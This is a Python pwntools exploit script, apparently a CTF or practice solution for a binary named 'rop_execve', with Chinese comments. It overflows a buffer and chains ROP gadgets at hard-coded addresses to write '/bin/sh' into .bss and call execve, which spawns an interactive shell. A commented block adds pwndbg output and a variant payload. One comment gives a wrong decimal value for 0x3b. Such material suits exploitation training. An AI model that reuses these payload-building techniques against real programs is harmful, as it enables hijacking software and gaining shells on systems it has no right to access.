from pwn import *

r = process(r'./rop_execve')

context.log_level = 'debug'

'''
syscall execve(“/bin/sh”,0,0)
rax=3b
rdi=/bin/sh
rsi=0
rdx=0
'''

bss_addr = 0x6b6900
ret_addr = 0x400416
pop_rdi = 0x400686
pop_rsi = 0x410093
pop_rdx = 0x4494b5
pop_rax = 0x415294
# pop_rdx_rsi_ret = 0x44ba39
syscall = 0x4011fc
# ROPgadget --binary=rop | grep "qword ptr \[rdi\]," | grep "ret"
# 0x0000000000435233 : mov qword ptr [rdi], rdx ; ret  # 控制rdx，从而控制rdi的地址
# 0x0000000000446c1b : mov qword ptr [rdi], rsi ; ret  # 控制rsi，从而控制rdi的地址
mov_rdi_rsi = 0x446c1b

# gdb.attach(r, b'b read')

payload = b'A' * 0x10 + b'B' * 8
payload += p64(pop_rdi) + p64(bss_addr)  # 将rdi的值设为bss的地址
payload += p64(pop_rsi) + b'/bin/sh\x00'  # 将/bin/sh写入rsi寄存器中
payload += p64(mov_rdi_rsi)  # *(rdi) = rsi，即把/bin/sh\x00写入0x6b6900
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(0x3b)  # rax设为56，调用execve的信号值
payload += p64(syscall)

r.sendlineafter(b';)', payload)
r.interactive()


'''
调试发现RSI存了buf的开头地址
RSI  0x7ffc080c8830 ◂— 0x68732f6e69622f /* '/bin/sh' */

查看 0x7ffc080c8830 附近的值
pwndbg> tele 0x7ffc080c8830                                                                                
00:0000│ rsi 0x7ffc080c8830 ◂— 0x68732f6e69622f /* '/bin/sh' */                                            
01:0008│     0x7ffc080c8838 ◂— 0x4141414141414141 ('AAAAAAAA')                                             
02:0010│     0x7ffc080c8840 ◂— 0x4141414141414141 ('AAAAAAAA')                                             
03:0018│     0x7ffc080c8848 —▸ 0x40110a (__libc_start_main+778) ◂— 0xfb810000d940e8c7                      
04:0020│ rsp 0x7ffc080c8850 ◂— 0x0                                                                         
05:0028│     0x7ffc080c8858 ◂— 0x100000000                                                                 
06:0030│     0x7ffc080c8860 —▸ 0x7ffc080c8968 —▸ 0x7ffc080c9391 ◂— 0x4f4300706f722f2e /* './rop' */        
07:0038│     0x7ffc080c8868 —▸ 0x400b4d (main) ◂— push rbp            

发现/bin/sh（hex值为：0x0068732f6e69622f）成功写入到地址 0x7ffc080c8830 （rsi） 中
为什么是rdi寄存器接受呢？
因为查看代码中read函数：read(0, v4, 144); 我们输入的v4值是第二个参数，对应的是rsi接收

# 假设找到一个gadget(这个程序中没有找到)
# 0x0000000000446c1b : mov rdi, rsi ; ret  # rsi的地址赋值给rdi
mov_rdi_rsi_2 = 0x446c1b

# rsi存储的是buf的开头地址，rsi + x010 即为sh字符串的地址
payload = b'/bin/sh\x00' + b'A' * 0x10  # 将/bin/sh写入rsi寄存器中
payload += p64(mov_rdi_rsi_2)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(0x3b)  # rax设为56，调用execve的信号值
payload += p64(syscall)

r.sendlineafter(b';)', payload)
r.interactive()
'''
